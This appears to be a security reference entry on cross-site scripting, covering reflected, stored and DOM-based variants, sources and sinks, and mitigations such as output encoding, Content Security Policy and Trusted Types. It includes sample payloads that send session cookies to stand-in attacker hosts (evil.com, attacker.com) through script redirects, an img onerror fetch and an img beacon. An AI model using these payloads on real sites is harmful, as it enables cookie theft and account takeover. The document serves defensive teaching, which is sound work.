XSS — Cross-Site Scripting

Category: Client-Side Attacks — Injection
OWASP: A03:2021 — Injection
CWE: CWE-79
Applies To: All web applications that render user-controlled data in HTML, JS, or URL contexts

Overview

Cross-Site Scripting is a code injection attack where an attacker injects malicious JavaScript (or other executable code) into a web page that is then served to and executed by other users' browsers. The injected script runs in the context of the victim's session, inheriting their cookies, credentials, DOM access, and same-origin privileges. XSS is consistently in the OWASP Top 10 and is one of the most common, most impactful, and most frequently exploited vulnerability classes in web applications.

At Google Chrome scale, XSS in a first-party property (gmail.com, accounts.google.com) could affect hundreds of millions of users. A single XSS vector in an authentication page can steal session cookies for all users who hit the page. Chrome's XSS Auditor was deprecated because server-side output encoding and Content Security Policy are the correct defenses; browser-side XSS filtering cannot reliably distinguish attack from benign content.

XSS is divided into three types based on how the malicious payload is delivered and persisted.

How It Works

Type 1: Reflected XSS

The payload is embedded in the URL or request parameter, reflected back in the HTTP response, and executed in the victim's browser. The attacker sends the victim a crafted URL.

Example:

URL: https://search.example.com/?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

If the server renders q directly into the HTML without encoding:

<p>
  Search results for:
  <script>
    document.location = "https://evil.com/?c=" + document.cookie;
  </script>
</p>

The victim's browser executes the script in the context of search.example.com.

    participant Attacker as Attacker
    participant Victim as Victim User
    participant App as search.example.com
    participant C2 as evil.com

    Attacker->>Victim: Send phishing link with XSS payload in URL
    Victim->>App: GET /search?q=
    App-->>Victim: HTML response with unencoded payload reflected

    Victim->>C2: Exfiltrates session cookie
    C2->>Attacker: Attacker receives stolen cookie
    Attacker->>App: Replay cookie to access victim account

Type 2: Stored (Persistent) XSS

The payload is stored in the server's database and served to every user who views the content. More dangerous because it does not require social engineering each victim.

Example: An attacker posts a forum comment:

Great post! <img src="x" onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">

Every user who views the comment page has their cookies exfiltrated.

flowchart TD
    A[Attacker submits content with XSS payload] --> B[Server stores payload in database without sanitization]
    B --> C[Victim loads page containing stored payload]
    C --> D[Browser renders payload as executable code]
    D --> E[Script executes in victim browser context]
    E --> F[Cookie theft, session hijacking, or further attack]

Type 3: DOM-Based (Client-Side) XSS

The payload is processed entirely in the browser's DOM without being reflected from the server. JavaScript on the page reads attacker-controlled data from the URL fragment (#hash), URL parameters via location.search, document.referrer, etc., and writes it into the DOM using dangerous sinks.

Example:

// Vulnerable code
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = "Hello, " + name; // SINK: innerHTML

URL: https://app.example.com/welcome?name=<img src=x onerror=alert(1)>

The server never sees or reflects the payload. The vulnerability is entirely in the client-side JavaScript.

Common DOM XSS Sources (attacker-controlled input):

  • document.URL, document.location
  • location.href, location.search, location.hash
  • document.referrer
  • window.name
  • postMessage event data

Common DOM XSS Sinks (dangerous output methods):

  • innerHTML, outerHTML, insertAdjacentHTML
  • document.write(), document.writeln()
  • eval(), setTimeout(string), setInterval(string), Function()
  • src attribute on script tags
  • location.href =, location.assign() (can cause javascript: URI execution)
flowchart TD
    A[URL contains XSS payload in hash or query param] --> B[Page JavaScript reads URL data]
    B --> C{Written to dangerous sink?}
    C -- innerHTML/document.write/eval --> D[Script or HTML injected into DOM]
    D --> E[Browser executes in page origin context]
    C -- Safe encoding function used --> F[Rendered as text, not code]

XSS Payload Capabilities

A successful XSS script running in the victim's browser can:

  • Steal session cookies (if not HttpOnly)
  • Read and exfiltrate page content (forms, tokens, data)
  • Perform actions as the victim (change password, place orders, transfer funds)
  • Inject phishing content into the legitimate page
  • Exploit postMessage APIs to bridge to other origins
  • Capture keystrokes including passwords as the user types
  • Access browser extensions' message APIs
  • Spread to other users (worm via stored XSS)
  • Use the browser as a botnet node (BeEF hook)

The <img> Cross-Origin Request Vector

<img src="https://attacker.com/collect?data=EXFIL" />

Images are loaded cross-origin without CORS restrictions. An injected <img> tag can:

  • Exfiltrate data by encoding it in the URL query string
  • Trigger a cross-origin GET request to an attacker's server
  • Perform CSRF-like side effects on servers that process GET requests with state changes (GET-based state changes are an anti-pattern but common in legacy systems)
  • Not be blocked by HttpOnly cookie isolation (it uses the img tag, not XHR)

Mitigation Controls

# Failure Mitigation Layer / Where Applied
1 Reflected XSS Context-aware output encoding (HTML-encode in HTML context; JS-encode in script context; URL-encode in URL context) Server-side templates and rendering
2 Stored XSS Sanitize on output, not just input; use a vetted HTML sanitization library (DOMPurify) for rich text Storage + rendering layer
3 DOM XSS Replace dangerous sinks (innerHTML) with safe alternatives (textContent); use trusted types API Client-side JS code review
4 XSS on auth pages HttpOnly cookies + strict CSP on auth pages + sub-resource integrity Cookie flags + CSP policy
5 JSON served as HTML Set Content-Type: application/json explicitly; never return user data in text/html responses API response headers
6 SVG upload XSS Serve user-uploaded files from a separate sandboxed domain (e.g., usercontent.google.com); strip script content from SVG Upload handling + origin isolation
7 WAF bypass WAF is not the primary XSS defense; use it as a secondary layer; fix the root cause (output encoding) Defense in depth
8 Mutation XSS Use well-maintained sanitizer like DOMPurify which handles mXSS; test against known mXSS payloads Server + client sanitization
9 Header injection Validate and reject newline characters in any user data used in response headers Input validation
10 Dangling markup Strict CSP with img-src 'self' and form-action 'self' limits exfiltration paths CSP header

Content Security Policy For XSS Defense

CSP is the most powerful defense-in-depth control against XSS. A strict CSP prevents injected scripts from executing even if XSS is present:

Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-RANDOM_NONCE';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  img-src 'self' data:;
CSP Directive XSS Defense
script-src 'nonce-RANDOM' Inline scripts without matching nonce are blocked
script-src 'strict-dynamic' Trusted scripts can load others; eliminates long allowlists
object-src 'none' Blocks Flash and other plugin-based execution
base-uri 'self' Prevents <base> tag injection from changing relative URLs
form-action 'self' Blocks form data exfiltration to attacker origins

Trusted Types API: Chrome-only API that forces all DOM sink assignments through validated transformers, making DOM XSS nearly impossible if deployed correctly.

Top 3 Critical Mitigations

  1. Context-aware output encoding everywhere. The root cause of every XSS is content being interpreted as code instead of data. HTML-encode user input in HTML context, JavaScript-encode in script context, URL-encode in URL context, and CSS-encode in style context. Never use a single "strip bad chars" approach — encoding must match the rendering context.
  2. Deploy Content Security Policy with nonce-based script allowlisting. Even if output encoding fails, a strict CSP with script-src 'nonce-RANDOM' prevents the injected script from executing. Use CSP in report-only mode first to detect violations without breaking functionality, then enforce. This is defense in depth but critical for high-security pages like login and payment flows.
  3. Treat DOM XSS as a first-class code review issue. DOM XSS is invisible to server-side scans and commonly missed. Audit all uses of innerHTML, document.write(), eval(), and location.href =. Replace with safe alternatives: textContent instead of innerHTML, JSON.parse instead of eval. Enforce via Trusted Types and static analysis tooling in CI/CD.

Key Takeaways

  • XSS is content-as-code injection: attacker data is interpreted as executable scripts in the victim's browser.
  • Reflected = URL-based, one-victim; Stored = database-persisted, mass-victim; DOM = client-side only, server-blind.
  • The root cause is always insufficient output encoding for the rendering context.
  • HttpOnly limits cookie theft but does not stop authenticated actions, page content theft, or keyboard capture.
  • CSP with nonces is the most powerful defense-in-depth control; Trusted Types extends this to DOM operations.
  • An <img> tag is a cross-origin HTTP request — injected HTML does not need <script> to exfiltrate data.
  • Stored XSS is the highest-impact variant: one exploit affects every user who views the infected page, forever, until remediated.
